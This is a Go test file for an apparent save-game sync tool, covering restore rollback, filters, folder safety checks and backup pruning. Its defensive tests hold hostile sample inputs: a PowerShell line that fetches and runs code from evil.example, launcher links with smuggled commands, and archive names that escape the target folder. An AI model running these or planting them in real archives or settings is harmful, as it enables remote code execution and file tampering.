//go:build !windows

package core

import (
	"archive/tar"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/klauspost/compress/zstd"

	"peerly/proto"
)

func writeTree(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for name, content := range files {
		target := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(target), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(target, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func readTree(t *testing.T, root string) map[string]string {
	t.Helper()
	found := map[string]string{}
	entries, err := listFiles(root, IncludeFilter{})
	if err != nil {
		t.Fatal(err)
	}
	for _, entry := range entries {
		raw, err := os.ReadFile(entry.absolutePath)
		if err != nil {
			t.Fatal(err)
		}
		found[entry.relativePath] = string(raw)
	}
	return found
}

func packTree(t *testing.T, files map[string]string) string {
	t.Helper()
	source := filepath.Join(t.TempDir(), "source")
	writeTree(t, source, files)
	archive := filepath.Join(t.TempDir(), "save.tar.zst")
	if _, err := Pack(source, IncludeFilter{}, archive); err != nil {
		t.Fatal(err)
	}
	return archive
}

func TestRestoreRollsBackWhenAFileCannotBeMoved(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root ignores directory permissions")
	}
	save := filepath.Join(t.TempDir(), "SaveGames")
	original := map[string]string{"world.db": "old db", "locked/world.chunk": "old chunk", "character.fch": "mine"}
	writeTree(t, save, original)
	lockedDir := filepath.Join(save, "locked")
	os.Chmod(lockedDir, 0o555)
	t.Cleanup(func() { os.Chmod(lockedDir, 0o755) })

	archive := packTree(t, map[string]string{"world.db": "new db", "locked/world.chunk": "new chunk"})
	_, err := Restore(archive, save, ParseInclude("world.*"), filepath.Join(t.TempDir(), "backups"), true)
	var inUse *InUseError
	if !errors.As(err, &inUse) {
		t.Fatalf("expected an in-use error, got %v", err)
	}
	os.Chmod(lockedDir, 0o755)
	after := readTree(t, save)
	for name, content := range original {
		if after[name] != content {
			t.Fatalf("%s = %q after a failed restore, want the original %q", name, after[name], content)
		}
	}
	if len(after) != len(original) {
		t.Fatalf("failed restore left extra files: %v", after)
	}
	if _, err := os.Stat(save + outgoingSuffix); err == nil {
		t.Fatal("staging folder left behind")
	}
}

func TestRestoreRescuesFilesOfAnInterruptedRun(t *testing.T) {
	save := filepath.Join(t.TempDir(), "SaveGames")
	writeTree(t, save, map[string]string{"other.txt": "untouched"})
	writeTree(t, save+outgoingSuffix, map[string]string{"world.db": "the only copy of a player's world"})
	backups := filepath.Join(t.TempDir(), "backups")
	archive := packTree(t, map[string]string{"world.db": "group world"})
	if _, err := Restore(archive, save, ParseInclude("world.*"), backups, false); err != nil {
		t.Fatal(err)
	}
	rescued, _ := filepath.Glob(filepath.Join(backups, "*-recovered", "world.db"))
	if len(rescued) != 1 {
		t.Fatalf("files stranded by an interrupted restore were deleted instead of rescued: %v", rescued)
	}
	if got := readTree(t, save); got["world.db"] != "group world" || got["other.txt"] != "untouched" {
		t.Fatalf("save folder = %v", got)
	}
}

func TestExtractRejectsArchivesThatEscapeTheFolder(t *testing.T) {
	for _, name := range []string{"../escape.txt", "/etc/escape", `..\escape.txt`, "C:/escape.txt", "stream.txt:hidden"} {
		archive := filepath.Join(t.TempDir(), "evil.tar.zst")
		file, _ := os.Create(archive)
		compressor, _ := zstd.NewWriter(file)
		writer := tar.NewWriter(compressor)
		writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: 4, Typeflag: tar.TypeReg})
		writer.Write([]byte("evil"))
		writer.Close()
		compressor.Close()
		file.Close()
		destination := filepath.Join(t.TempDir(), "out")
		if _, err := extract(archive, destination); err == nil {
			t.Fatalf("archive entry %q was accepted", name)
		}
	}
}

func TestFilterIgnoresLetterCaseAndSupportsExclusions(t *testing.T) {
	filter := ParseInclude(" MyWorld.* , !*.BAK ")
	for name, want := range map[string]bool{
		"myworld.sav": true, "MYWORLD.db": true, "MyWorld.sav.bak": false, "Other.sav": false, "sub/MyWorld.sav": true,
	} {
		if got := filter.Matches(name); got != want {
			t.Errorf("Matches(%q) = %v, want %v", name, got, want)
		}
	}
	if err := ParseInclude("My[World.*").Validate(); err == nil {
		t.Error("unclosed bracket was accepted")
	}
}

func TestSurveyShowsWhyNothingMatches(t *testing.T) {
	save := filepath.Join(t.TempDir(), "Game", "Saves")
	writeTree(t, save, map[string]string{"RealName.sav": "x", "RealName.sav.backup": "y"})
	survey := SurveyFolder(save, ParseInclude("Typo.*"))
	if survey.Problem != "" || !survey.FolderExists || survey.MatchedCount != 0 || len(survey.Others) != 2 {
		t.Fatalf("survey = %+v", survey)
	}
	missing := SurveyFolder(filepath.Join(save, "nope"), IncludeFilter{})
	if missing.FolderExists || !missing.ParentExists {
		t.Fatalf("missing folder survey = %+v", missing)
	}
}

func TestCheckSaveFolderRejectsBroadFolders(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Skip("no home directory")
	}
	for _, folder := range []string{"/", home, filepath.Dir(home), filepath.Join(home, "Documents"), filepath.Join(home, "AppData", "LocalLow"), filepath.Join(home, ".config"), "relative/path", `%UNKNOWN_VARIABLE%\Saves`, ""} {
		if err := CheckSaveFolder(folder); err == nil {
			t.Errorf("%q was accepted as a save folder", folder)
		}
	}
	for _, folder := range []string{filepath.Join(home, "AppData", "LocalLow", "IronGate", "Valheim", "worlds_local"), filepath.Join(home, ".config", "unity3d", "IronGate", "Valheim", "worlds_local"), filepath.Join(home, "Documents", "My Games", "Game", "Saves")} {
		if err := CheckSaveFolder(folder); err != nil {
			t.Errorf("%q was rejected: %v", folder, err)
		}
	}
}

func TestNormalizeServerURL(t *testing.T) {
	for raw, want := range map[string]string{
		"saves.example.com":             "https://saves.example.com",
		"  https://saves.example.com/ ": "https://saves.example.com",
		"localhost:8787":                "http://localhost:8787",
		"127.0.0.1:8787/":               "http://127.0.0.1:8787",
		"http://10.0.0.5:8787":          "http://10.0.0.5:8787",
	} {
		got, err := NormalizeServerURL(raw)
		if err != nil || got != want {
			t.Errorf("NormalizeServerURL(%q) = %q, %v, want %q", raw, got, err, want)
		}
	}
	for _, raw := range []string{"", "   ", "ftp://example.com", "https://"} {
		if _, err := NormalizeServerURL(raw); err == nil {
			t.Errorf("NormalizeServerURL(%q) was accepted", raw)
		}
	}
}

func TestGroupSuppliedLaunchCommandIsNeverTrusted(t *testing.T) {
	hostile := proto.World{DefaultLaunch: `powershell -c "iwr evil.example | iex"`, DefaultSavePath: "/somewhere", DefaultProcess: "game.exe"}
	resolved := ResolveSettings(hostile, WorldSettings{})
	if resolved.Launch != "" || resolved.LaunchSuggestion != hostile.DefaultLaunch {
		t.Fatalf("hostile default launch was applied: %+v", resolved)
	}
	steam := proto.World{DefaultLaunch: "steam://rungameid/892970"}
	if got := ResolveSettings(steam, WorldSettings{}).Launch; got != steam.DefaultLaunch {
		t.Fatalf("plain steam link was not proposed: %q", got)
	}
	for _, sneaky := range []string{"steam://rungameid/892970 & calc.exe", "steam://run/1//-applaunch", `steam://rungameid/1"&calc`} {
		if IsLauncherLink(sneaky) {
			t.Errorf("%q passed as a harmless launcher link", sneaky)
		}
	}
	pinned := ResolveSettings(hostile, WorldSettings{Confirmed: true, SavePath: "/mine", Launch: ""})
	if pinned.Launch != "" || pinned.SavePath != "/mine" || pinned.Process != "" || !strings.HasSuffix(pinned.Folder, "mine") {
		t.Fatalf("group defaults leaked into confirmed local settings: %+v", pinned)
	}
}

func TestRestoreLeavesFilesOutsideTheLocalFilterAlone(t *testing.T) {
	save := filepath.Join(t.TempDir(), "SaveGames")
	writeTree(t, save, map[string]string{"world.db": "old world", "character.fch": "MY character"})
	archive := packTree(t, map[string]string{"world.db": "group world", "character.fch": "someone else's character", "plugin.dll": "planted"})
	result, err := Restore(archive, save, ParseInclude("world.*"), filepath.Join(t.TempDir(), "backups"), false)
	if err != nil {
		t.Fatal(err)
	}
	after := readTree(t, save)
	if after["character.fch"] != "MY character" || after["world.db"] != "group world" || len(after) != 2 || len(result.Skipped) != 2 {
		t.Fatalf("files outside the filter were written: %v skipped=%v", after, result.Skipped)
	}
}

func TestDamagedSettingsFallBackToThePreviousCopy(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "config")
	config, err := LoadConfig(dir)
	if err != nil {
		t.Fatal(err)
	}
	config.Update(func(stored *Config) {
		stored.Token = "precious-member-token"
		stored.ServerURL = "https://saves.example.com"
	})
	config.Update(func(stored *Config) { stored.Group.Name = "second write creates the backup copy" })
	os.WriteFile(filepath.Join(dir, "config.json"), []byte{}, 0o600)
	recovered, err := LoadConfig(dir)
	if err != nil {
		t.Fatal(err)
	}
	if recovered.Snapshot().Token != "precious-member-token" || recovered.Notice == "" {
		t.Fatalf("token lost after a truncated settings file: %+v notice=%q", recovered.Snapshot(), recovered.Notice)
	}
}

func TestTheFirstLocalBackupIsKeptForever(t *testing.T) {
	root := filepath.Join(t.TempDir(), "backups")
	for index := range keptBackups + 4 {
		dir := filepath.Join(root, fmt.Sprintf("2026%02d01-000000.000", index+1))
		if err := os.MkdirAll(dir, 0o750); err != nil {
			t.Fatal(err)
		}
		if err := pruneBackups(root); err != nil {
			t.Fatal(err)
		}
	}
	entries, _ := os.ReadDir(root)
	names := []string{}
	for _, entry := range entries {
		names = append(names, entry.Name())
	}
	if len(names) != keptBackups || names[0] != "20260101-000000.000" || names[len(names)-1] != fmt.Sprintf("2026%02d01-000000.000", keptBackups+4) {
		t.Fatalf("kept backups = %v", names)
	}
}
